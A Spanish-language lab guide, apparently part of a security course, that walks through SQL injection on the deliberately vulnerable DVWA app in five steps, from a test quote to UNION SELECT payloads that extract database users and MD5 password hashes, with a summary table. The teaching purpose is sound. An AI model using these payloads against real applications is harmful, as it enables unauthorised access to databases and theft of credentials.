---
sidebar_position: 4
title: Práctica paso a paso
---

# Práctica paso a paso

Con DVWA preparada, se entra a la sección **SQL Injection** del menú. Aparece un campo que pide un **User ID**. Ahí se harán las pruebas, de la más simple a la más avanzada.

## Paso 1. Comprobar que el campo es vulnerable

Se escribe una comilla simple y se envía:

```
1'
```

Si aparece un **error de SQL**, significa que el campo es vulnerable: la comilla "rompió" la consulta porque la aplicación no la filtró. Este error es la primera señal de que el ataque es posible.

## Paso 2. Hacer la consulta siempre verdadera

Se escribe:

```
1' OR '1'='1
```

En lugar de un solo usuario, la página devuelve **todos los usuarios**. Esto demuestra que se logró cambiar la lógica de la consulta, igual que en el ejemplo explicado antes.

## Paso 3. Averiguar el número de columnas

Para extraer información oculta primero se necesita saber cuántas columnas devuelve la consulta. Se prueba subiendo el número hasta que dé error:

```
1' ORDER BY 2 -- 
```

## Paso 4. Extraer información de la base de datos

Una vez conocido el número de columnas, se pueden pedir datos del propio sistema, como el usuario de la base de datos y su nombre:

```
1' UNION SELECT user(), database() -- 
```

## Paso 5. Obtener usuarios y contraseñas

Finalmente se extraen los usuarios y contraseñas guardados en la tabla de ejemplo:

```
1' UNION SELECT user, password FROM users -- 
```

Las contraseñas aparecen convertidas en **hash MD5**, no en texto plano. Esto sirve para explicar que, aunque las contraseñas estén cifradas, el atacante igual puede verlas si la aplicación es vulnerable, y que por eso el cifrado no sustituye a una buena programación.

## Resumen de la práctica manual

| Paso | Lo que se escribe | Lo que demuestra |
|------|-------------------|------------------|
| 1 | `1'` | El campo es vulnerable (da error). |
| 2 | `1' OR '1'='1` | Se devuelven todos los usuarios. |
| 3 | `1' ORDER BY 2 -- ` | Se descubre el número de columnas. |
| 4 | `1' UNION SELECT user(), database() -- ` | Se obtienen datos del sistema. |
| 5 | `1' UNION SELECT user, password FROM users -- ` | Se extraen usuarios y contraseñas. |
